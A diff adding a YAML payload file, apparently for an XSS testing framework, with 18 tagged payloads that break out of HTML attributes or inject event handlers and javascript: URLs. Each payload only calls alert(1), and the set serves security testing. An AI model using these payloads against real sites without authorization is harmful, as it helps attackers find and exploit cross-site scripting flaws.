@@ -1,0 +1,94 @@
+# XSS Framework — Attribute Injection Payload Set
+# Payloads designed to break out of HTML attribute context or inject into
+# existing attribute values to introduce new event handlers.
+category: attribute_injection
+payloads:
+  - text: '"><script>alert(1)</script>'
+    tags: [attribute-breakout, script-injection, double-quote-close]
+    description: Close double-quoted attribute then inject script tag
+    severity: high
+
+  - text: "'><script>alert(1)</script>"
+    tags: [attribute-breakout, script-injection, single-quote-close]
+    description: Close single-quoted attribute then inject script tag
+    severity: high
+
+  - text: '"><img src=x onerror=alert(1)>'
+    tags: [attribute-breakout, img, event-handler, double-quote-close]
+    description: Break out of double-quoted attribute into img onerror
+    severity: high
+
+  - text: "'><img src=x onerror=alert(1)>"
+    tags: [attribute-breakout, img, event-handler, single-quote-close]
+    description: Break out of single-quoted attribute into img onerror
+    severity: high
+
+  - text: '"><svg/onload=alert(1)>'
+    tags: [attribute-breakout, svg, onload, double-quote-close]
+    description: Break out of double-quoted attribute into svg onload
+    severity: high
+
+  - text: "\" onmouseover=\"alert(1)\""
+    tags: [attribute-injection, event-handler, same-tag, double-quoted]
+    description: Inject onmouseover into same element (double-quoted context)
+    severity: high
+
+  - text: "' onmouseover='alert(1)'"
+    tags: [attribute-injection, event-handler, same-tag, single-quoted]
+    description: Inject onmouseover into same element (single-quoted context)
+    severity: high
+
+  - text: '" autofocus onfocus="alert(1)'
+    tags: [attribute-injection, autofocus, onfocus, double-quoted]
+    description: Inject autofocus + onfocus into existing tag (double-quoted)
+    severity: high
+
+  - text: "' autofocus onfocus='alert(1)"
+    tags: [attribute-injection, autofocus, onfocus, single-quoted]
+    description: Inject autofocus + onfocus into existing tag (single-quoted)
+    severity: high
+
+  - text: '" onclick="alert(1)'
+    tags: [attribute-injection, onclick, double-quoted]
+    description: Inject onclick into same tag (double-quoted context)
+    severity: medium
+
+  - text: '" onerror="alert(1)'
+    tags: [attribute-injection, onerror, double-quoted]
+    description: Inject onerror into same tag (double-quoted context)
+    severity: high
+
+  - text: '"><details open ontoggle=alert(1)>'
+    tags: [attribute-breakout, details, ontoggle, double-quote-close]
+    description: Break out into details ontoggle
+    severity: high
+
+  - text: '" href="javascript:alert(1)'
+    tags: [attribute-injection, javascript-url, href]
+    description: "Overwrite href with javascript: URL (double-quoted context)"
+    severity: high
+
+  - text: "' href='javascript:alert(1)"
+    tags: [attribute-injection, javascript-url, href, single-quoted]
+    description: "Overwrite href with javascript: URL (single-quoted context)"
+    severity: high
+
+  - text: '" style="background:url(javascript:alert(1))'
+    tags: [attribute-injection, css-injection, javascript-url]
+    description: "CSS background-url with javascript: in style attribute"
+    severity: medium
+
+  - text: '`><script>alert(1)</script>'
+    tags: [attribute-breakout, backtick, script-injection]
+    description: Break out of backtick-quoted attribute (rare but valid in some parsers)
+    severity: medium
+
+  - text: '"><body onload=alert(1)>'
+    tags: [attribute-breakout, body, onload, double-quote-close]
+    description: Break out then inject body onload
+    severity: medium
+
+  - text: '" onload="alert(1)'
+    tags: [attribute-injection, onload, double-quoted]
+    description: Inject onload into same tag (double-quoted context)
+    severity: high
